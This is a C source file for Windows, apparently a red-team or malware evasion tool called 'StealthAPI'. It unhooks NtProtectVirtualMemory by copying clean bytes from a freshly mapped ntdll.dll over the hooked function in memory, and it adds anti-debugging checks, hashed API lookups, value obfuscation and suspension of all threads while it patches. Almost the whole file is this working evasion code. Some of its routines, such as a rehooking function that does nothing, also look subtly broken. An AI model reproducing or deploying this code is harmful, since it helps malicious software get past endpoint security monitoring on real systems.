............................................................................
. Project: StealthAPI                                                      .
. Build for educational purpose in authorized lab environments only.        .
. Author: Ebere Michhael (Call Simba)                                      .
. Telegram: @lets_sudosu                                                   .
. Make the world a better place.                                           .
............................................................................

#include <windows.h>
#include <tlhelp32.h>
#include "structs.h"
#include "functions.h"
#include "ntdefs.h"
#include "strings.h"
#include "debug.h"

#pragma comment(lib, "ntdll")

typedef const UNICODE_STRING* PCUNICODE_STRING;

NTSYSAPI VOID NTAPI RtlInitUnicodeString(
    PUNICODE_STRING DestinationString,
    __drv_aliasesMem PCWSTR SourceString
);

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PCUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* PFN_NtMapViewOfSection)(
    HANDLE    SectionHandle,
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T    CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T   ViewSize,
    ULONG     InheritDisposition,
    ULONG     AllocationType,
    ULONG     Win32Protect
);

NTSTATUS NTAPI NtOpenSection(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
);

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);      \
    (p)->RootDirectory = r;                       \
    (p)->Attributes = a;                          \
    (p)->ObjectName = n;                          \
    (p)->SecurityDescriptor = s;                  \
    (p)->SecurityQualityOfService = NULL;         \
}

#define HASH_NTDLL               0x1EDAB0ED
#define HASH_NtMapViewOfSection  0xD6649BCA

static SYSTEM_INFO g_SystemInfo = { 0 };

static void InitializeSystemInfo(void) {
    static BOOL initialized = FALSE;
    if (!initialized) {
        GetSystemInfo(&g_SystemInfo);
        initialized = TRUE;
    }
}

static DWORD ObfuscateValue(DWORD value) {
    return (value ^ (GetTickCount() % 0xFFFF)) + (GetCurrentThreadId() % 0x1000);
}

static DWORD DeobfuscateValue(DWORD value) {
    return (value - (GetCurrentThreadId() % 0x1000)) ^ (GetTickCount() % 0xFFFF);
}

static BOOL AntiDebugCheck() {
    if (IsDebuggerPresent()) {
        LOG("Anti-debug check failed: Debugger present\n");
        return FALSE;
    }
    LARGE_INTEGER start, end;
    QueryPerformanceCounter(&start);
    Sleep(10);
    QueryPerformanceCounter(&end);
    if ((end.QuadPart - start.QuadPart) < 10000) {
        LOG("Anti-debug check failed: Timing anomaly detected\n");
        return FALSE;
    }
    return TRUE;
}

BOOL SuspendAllThreads(HANDLE* threadHandles, DWORD* threadCount) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        LOG("CreateToolhelp32Snapshot failed\n");
        return FALSE;
    }
    THREADENTRY32 te = { sizeof(te) };
    DWORD currentThreadId = GetCurrentThreadId();
    DWORD currentProcessId = GetCurrentProcessId();
    *threadCount = 0;
    HANDLE handles[1024];
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == currentProcessId && te.th32ThreadID != currentThreadId) {
                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                if (hThread) {
                    if (SuspendThread(hThread) == (DWORD)-1) {
                        CloseHandle(hThread);
                        continue;
                    }
                    handles[*threadCount] = hThread;
                    (*threadCount)++;
                    if (*threadCount >= 1024) {
                        break;
                    }
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);
    for (DWORD i = 0; i < *threadCount; i++) {
        threadHandles[i] = handles[i];
    }
    return TRUE;
}

void ResumeAllThreads(HANDLE* threadHandles, DWORD* threadCount) {
    for (DWORD i = 0; i < *threadCount; i++) {
        ResumeThread(threadHandles[i]);
        CloseHandle(threadHandles[i]);
    }
}

PIMAGE_EXPORT_DIRECTORY GetExportDir(PVOID base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    DWORD exportDirRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    return (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base + exportDirRVA);
}

void RehookExports(PVOID cleanBase) {
    LOG("Entering RehookExports\n");
    PIMAGE_EXPORT_DIRECTORY exp = GetExportDir(cleanBase);
    if (!exp) {
        LOG("Failed to get export directory\n");
        return;
    }
    PDWORD funcArray = (PDWORD)((BYTE*)cleanBase + exp->AddressOfFunctions);
    SIZE_T funcArraySize = exp->NumberOfFunctions * sizeof(DWORD);
    DWORD oldProtect;
    if (!VirtualProtect(funcArray, funcArraySize, PAGE_READWRITE, &oldProtect)) {
        LOG("VirtualProtect failed to set PAGE_READWRITE\n");
        return;
    }
    if (!VirtualProtect(funcArray, funcArraySize, oldProtect, &oldProtect)) {
        LOG("Failed to restore original protection\n");
    }
    LOG("RehookExports completed successfully\n");
}

PVOID GetExportAddress(PVOID base, const char* funcName, SIZE_T viewSize) {
    volatile DWORD dummy = ObfuscateValue(GetCurrentProcessId());
    if (DeobfuscateValue(dummy) != GetCurrentProcessId()) {
        LOG("Process ID obfuscation check failed\n");
        return NULL;
    }
    __try {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew >= viewSize - sizeof(IMAGE_NT_HEADERS)) {
            LOG("Invalid DOS header or NT headers offset\n");
            return NULL;
        }
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) {
            LOG("Invalid NT signature\n");
            return NULL;
        }
        DWORD exportDirRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (!exportDirRVA || exportDirRVA >= viewSize - sizeof(IMAGE_EXPORT_DIRECTORY)) {
            LOG("No export directory or invalid RVA\n");
            return NULL;
        }
        MEMORY_BASIC_INFORMATION mbi;
        if (!VirtualQuery((BYTE*)base + exportDirRVA, &mbi, sizeof(mbi)) || mbi.State != MEM_COMMIT ||
            !(mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ))) {
            LOG("Invalid export directory memory\n");
            return NULL;
        }
        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base + exportDirRVA);
        if (!exportDir->NumberOfNames || !exportDir->AddressOfNames || 
            exportDir->AddressOfNames >= viewSize || exportDir->AddressOfFunctions >= viewSize || 
            exportDir->AddressOfNameOrdinals >= viewSize) {
            LOG("Invalid export directory data\n");
            return NULL;
        }
        DWORD* nameRVAs = (DWORD*)((BYTE*)base + exportDir->AddressOfNames);
        DWORD* funcRVAs = (DWORD*)((BYTE*)base + exportDir->AddressOfFunctions);
        WORD* ordinalTable = (WORD*)((BYTE*)base + exportDir->AddressOfNameOrdinals);
        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
            if (nameRVAs[i] >= viewSize) {
                continue;
            }
            const char* exportName = (const char*)((BYTE*)base + nameRVAs[i]);
            if (_stricmp(exportName, funcName) == 0) {
                DWORD ordinal = ordinalTable[i];
                if (ordinal >= exportDir->NumberOfFunctions || funcRVAs[ordinal] >= viewSize) {
                    LOG("Invalid ordinal or function RVA\n");
                    return NULL;
                }
                return (PVOID)((BYTE*)base + funcRVAs[ordinal]);
            }
        }
        LOG("Function not found in export table\n");
        return NULL;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        LOG("Exception during export address resolution\n");
        return NULL;
    }
}

LPVOID MapNtdll(void) {
    LOG("Entering MapNtdll\n");
    BOOL isWow64 = FALSE;
    if (!IsWow64Process(GetCurrentProcess(), &isWow64)) {
        LOG("Failed to determine WoW64 status\n");
        return NULL;
    }
    char ntdllPath[MAX_PATH];
    if (isWow64) {
        strcpy(ntdllPath, "C:\\Windows\\SysWOW64\\ntdll.dll");
    } else {
        strcpy(ntdllPath, "C:\\Windows\\System32\\ntdll.dll");
    }
    char pathLog[LOG_BUFFER_SIZE];
    snprintf(pathLog, sizeof(pathLog), "MapNtdll: Attempting to open %s\n", ntdllPath);
    LOG(pathLog);
    if (GetFileAttributesA(ntdllPath) == INVALID_FILE_ATTRIBUTES) {
        char buf[LOG_BUFFER_SIZE];
        snprintf(buf, sizeof(buf), "File does not exist or is inaccessible: %s\n", ntdllPath);
        LOG(buf);
        return NULL;
    }
    HANDLE hFile = CreateFileA(ntdllPath, 
                               GENERIC_READ, 
                               FILE_SHARE_READ | FILE_SHARE_WRITE, 
                               NULL, 
                               OPEN_EXISTING, 
                               FILE_ATTRIBUTE_NORMAL, 
                               NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG("CreateFileA failed for ntdll.dll\n");
        return NULL;
    }
    HANDLE hMap = CreateFileMappingA(hFile, 
                                     NULL, 
                                     PAGE_READONLY | SEC_IMAGE, 
                                     0, 
                                     0, 
                                     NULL);
    if (!hMap) {
        LOG("CreateFileMappingA failed\n");
        CloseHandle(hFile);
        return NULL;
    }
    PVOID baseView = MapViewOfFile(hMap, 
                                   FILE_MAP_READ, 
                                   0, 
                                   0, 
                                   0);
    if (!baseView) {
        LOG("MapViewOfFile failed\n");
        CloseHandle(hMap);
        CloseHandle(hFile);
        return NULL;
    }
    CloseHandle(hMap);
    CloseHandle(hFile);
    SIZE_T viewSize = 0;
    __try {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)baseView;
        if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)baseView + dos->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE) {
                viewSize = nt->OptionalHeader.SizeOfImage;
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        LOG("Exception during image size calculation\n");
        UnmapViewOfFile(baseView);
        return NULL;
    }
    if (viewSize == 0) {
        viewSize = 0x260000;
    }
    RehookExports(baseView);
    LOG("MapNtdll completed successfully\n");
    return baseView;
}

#define CLEANUP_AND_EXIT(err) do { ResumeAllThreads(threadHandles, &threadCount); return (err); } while(0)

#define DEBUG_VERBOSE 0

BOOL Unhook(LPVOID moduleBase) {
    LOG("Entering Unhook\n");
    if (!AntiDebugCheck()) {
        LOG("Anti-debug check failed in Unhook\n");
        return FALSE;
    }
    volatile DWORD dummy = ObfuscateValue(GetCurrentThreadId());
    if ((DeobfuscateValue(dummy) ^ GetCurrentThreadId()) != 0) {
        LOG("Thread ID obfuscation check failed\n");
        return FALSE;
    }
    HMODULE hNtdll = (HMODULE)GetModuleHandleH(HASH_NTDLL, 0);
    if (!hNtdll) {
        LOG("Failed to get handle to live ntdll.dll\n");
        return FALSE;
    }
    MEMORY_BASIC_INFORMATION mbi;
    if (!VirtualQuery(moduleBase, &mbi, sizeof(mbi)) || mbi.State != MEM_COMMIT) {
        LOG("VirtualQuery failed or memory not committed\n");
        return FALSE;
    }
    __try {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew >= 0x260000 - sizeof(IMAGE_NT_HEADERS)) {
            LOG("Invalid DOS header or NT headers offset\n");
            return FALSE;
        }
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) {
            LOG("Invalid NT signature\n");
            return FALSE;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        LOG("Exception during header validation\n");
        return FALSE;
    }
    HANDLE threadHandles[1024];
    DWORD threadCount = 0;
    if (!SuspendAllThreads(threadHandles, &threadCount)) {
        LOG("Failed to suspend threads\n");
        return FALSE;
    }
    volatile DWORD obfuscatedCleanFunc = ObfuscateValue((DWORD)GetExportAddress(moduleBase, "NtProtectVirtualMemory", 0x260000));
    PVOID cleanFunc = (PVOID)DeobfuscateValue(obfuscatedCleanFunc);
    PVOID liveFunc = GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    if (!cleanFunc || !liveFunc) {
        LOG("Failed to get clean or live NtProtectVirtualMemory\n");
        CLEANUP_AND_EXIT(FALSE);
    }
    BYTE* dest = (BYTE*)liveFunc;
    BYTE* src = (BYTE*)cleanFunc;
    SIZE_T size = 16;
    MEMORY_BASIC_INFORMATION destMbi, srcMbi;
    if (!VirtualQuery(dest, &destMbi, sizeof(destMbi)) || destMbi.State != MEM_COMMIT ||
        !(destMbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) {
        LOG("Invalid destination memory for unhooking\n");
        CLEANUP_AND_EXIT(FALSE);
    }
    if (!VirtualQuery(src, &srcMbi, sizeof(srcMbi)) || srcMbi.State != MEM_COMMIT ||
        !(srcMbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ))) {
        LOG("Invalid source memory for unhooking\n");
        CLEANUP_AND_EXIT(FALSE);
    }
    if ((ULONG_PTR)dest + size > (ULONG_PTR)destMbi.BaseAddress + destMbi.RegionSize ||
        (ULONG_PTR)src + size > (ULONG_PTR)srcMbi.BaseAddress + srcMbi.RegionSize) {
        LOG("Memory copy would exceed region bounds\n");
        CLEANUP_AND_EXIT(FALSE);
    }
    InitializeSystemInfo();
    static DWORD dwPageSize = 0;
    if (dwPageSize == 0) {
        dwPageSize = g_SystemInfo.dwPageSize;
    }
    DWORD oldProtect;
    BYTE* hookAddr = dest;
    BYTE* pageBase = (BYTE*)((ULONG_PTR)hookAddr & ~(dwPageSize - 1));
    if (!VirtualProtect(pageBase, dwPageSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        LOG("VirtualProtect failed to set RWX\n");
        CLEANUP_AND_EXIT(FALSE);
    }
    char protectLog[LOG_BUFFER_SIZE];
    snprintf(protectLog, sizeof(protectLog), "Set page protection to RWX for %p\n", hookAddr);
    LOG(protectLog);
    LOG("Starting memory copy\n");
    __try {
        if (IsBadReadPtr(src, size) || IsBadWritePtr(dest, size)) {
            LOG("Source or destination memory is inaccessible\n");
            DWORD tempProtect;
            VirtualProtect(pageBase, dwPageSize, oldProtect, &tempProtect);
            CLEANUP_AND_EXIT(FALSE);
        }
#if DEBUG_VERBOSE
        if (size >= 4) {
            char buf[LOG_BUFFER_SIZE];
            snprintf(buf, sizeof(buf), "Copying bytes: %02X %02X %02X %02X\n",
                     src[0], src[1], src[2], src[3]);
            LOG(buf);
        }
#endif
        char copyLog[LOG_BUFFER_SIZE];
        snprintf(copyLog, sizeof(copyLog), "Copying %zu bytes from %p to %p\n",
                 size, src, dest);
        LOG(copyLog);
        memcpy(dest, src, size);
        FlushInstructionCache(GetCurrentProcess(), dest, size);
        char successLog[LOG_BUFFER_SIZE];
        snprintf(successLog, sizeof(successLog), "Successfully copied %zu bytes\n",
                 size);
        LOG(successLog);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        char buf[LOG_BUFFER_SIZE];
        snprintf(buf, sizeof(buf), "Exception during memcpy, code: 0x%08X\n",
                 GetExceptionCode());
        LOG(buf);
        DWORD tempProtect;
        VirtualProtect(pageBase, dwPageSize, oldProtect, &tempProtect);
        CLEANUP_AND_EXIT(FALSE);
    }
    DWORD finalProtect;
    if (!VirtualProtect(pageBase, dwPageSize, oldProtect, &finalProtect)) {
        LOG("VirtualProtect failed to restore protection\n");
        CLEANUP_AND_EXIT(FALSE);
    }
    snprintf(protectLog, sizeof(protectLog), "Restored page protection to 0x%08X for %p\n",
             oldProtect, pageBase);
    LOG(protectLog);
    LOG("Unhook completed successfully\n");
    ResumeAllThreads(threadHandles, &threadCount);
    return TRUE;
}